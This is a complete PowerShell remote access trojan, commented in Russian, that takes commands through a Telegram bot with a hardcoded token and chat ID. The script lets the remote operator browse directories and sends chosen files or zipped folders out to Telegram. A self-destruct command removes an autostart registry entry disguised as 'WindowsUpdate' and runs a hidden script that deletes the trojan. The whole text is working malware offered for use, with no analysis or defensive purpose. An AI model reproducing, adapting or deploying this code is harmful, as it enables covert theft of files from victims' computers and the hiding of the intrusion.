# RAT с управлением через Telegram
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"
$CurrentDir = Get-Location

# Функция отправки сообщений в Telegram
function Send-TelegramMessage {
    param([string]$Message, [string]$FilePath = $null)
    
    if ($FilePath) {
        $FileForm = @{
            chat_id = $ChatID
            document = Get-Item -Path $FilePath
        }
        $Response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/sendDocument" -Method Post -Form $FileForm
    } else {
        $Body = @{
            chat_id = $ChatID
            text = $Message
            parse_mode = "HTML"
        }
        $Response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/sendMessage" -Method Post -Body $Body
    }
}

# Функция получения команд
function Get-TelegramCommands {
    try {
        $Updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates" -Method Get
        if ($Updates.ok -and $Updates.result.Count -gt 0) {
            $LastUpdate = $Updates.result[-1]
            if ($LastUpdate.message.text -and $LastUpdate.message.chat.id -eq $ChatID) {
                # Очищаем полученные обновления
                Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$($LastUpdate.update_id + 1)" -Method Get | Out-Null
                return $LastUpdate.message.text
            }
        }
    } catch { }
    return $null
}

# Функция архивации и отправки папки
function Send-Folder {
    param([string]$FolderPath)
    
    $ZipPath = "$env:TEMP\$(Get-Random).zip"
    try {
        Compress-Archive -Path $FolderPath -DestinationPath $ZipPath -Force
        Send-TelegramMessage -FilePath $ZipPath
    } finally {
        if (Test-Path $ZipPath) { Remove-Item $ZipPath -Force }
    }
}

# Функция самоуничтожения
function Self-Destruct {
    $ScriptPath = $MyInvocation.MyCommand.Path
    $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    
    # Удаляем из автозагрузки
    if (Get-ItemProperty -Path $RegPath -Name "WindowsUpdate" -ErrorAction SilentlyContinue) {
        Remove-ItemProperty -Path $RegPath -Name "WindowsUpdate" -Force
    }
    
    # Создаем скрипт для удаления основного файла
    $RemoveScript = @"
Start-Sleep -Seconds 3
Remove-Item "$ScriptPath" -Force
Remove-Item "$env:TEMP\remove_rat.ps1" -Force
"@
    
    Set-Content -Path "$env:TEMP\remove_rat.ps1" -Value $RemoveScript
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -File `"$env:TEMP\remove_rat.ps1`"" -WindowStyle Hidden
    exit
}

# Основной цикл обработки команд
while ($true) {
    $Command = Get-TelegramCommands
    if ($Command) {
        switch -regex ($Command.Trim()) {
            "^/help$" {
                $HelpText = @"
Доступные команды:
/ls - список файлов в текущей директории
/cd [путь] - сменить директорию
/download [путь] - скачать файл или папку
/selfdestruct - самоуничтожение RAT
"@
                Send-TelegramMessage -Message $HelpText
            }
            "^/ls$" {
                $Files = Get-ChildItem -Path $CurrentDir.Path | Select-Object Name, Length, LastWriteTime
                $FileList = "Файлы в $($CurrentDir.Path):`n" + ($Files | Format-Table -AutoSize | Out-String)
                Send-TelegramMessage -Message $FileList
            }
            "^/cd (.+)$" {
                $NewPath = $matches[1]
                if (Test-Path $NewPath) {
                    Set-Location $NewPath
                    $CurrentDir = Get-Location
                    Send-TelegramMessage -Message "Директория изменена на: $($CurrentDir.Path)"
                } else {
                    Send-TelegramMessage -Message "Путь не найден: $NewPath"
                }
            }
            "^/download (.+)$" {
                $TargetPath = $matches[1]
                if (Test-Path $TargetPath) {
                    if (Get-Item $TargetPath -Force | Select-Object -ExpandProperty PSIsContainer) {
                        Send-TelegramMessage -Message "Начинаю архивацию папки: $TargetPath"
                        Send-Folder -FolderPath $TargetPath
                    } else {
                        Send-TelegramMessage -FilePath $TargetPath
                    }
                } else {
                    Send-TelegramMessage -Message "Файл/папка не найдены: $TargetPath"
                }
            }
            "^/selfdestruct$" {
                Send-TelegramMessage -Message "Активировано самоуничтожение RAT"
                Self-Destruct
            }
        }
    }
    Start-Sleep -Seconds 2
}
